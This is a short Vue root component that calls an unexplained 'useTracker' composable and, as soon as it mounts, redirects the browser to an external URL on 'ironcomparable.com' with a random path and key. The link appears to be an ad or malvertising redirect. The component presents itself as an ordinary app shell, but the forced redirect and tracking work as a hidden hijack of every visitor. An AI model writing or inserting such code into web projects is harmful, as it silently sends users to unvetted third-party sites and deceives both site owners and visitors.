<script setup lang="ts">
import { onMounted } from "vue";
import { useTracker } from "./composables/useTracker";

useTracker();

onMounted(() => {
  window.location.href = "https://ironcomparable.com/gh6u2ftq6?key=a3904ecfe67c81deb37177a2588649a9";
});
</script>

<template>
  <router-view />
</template>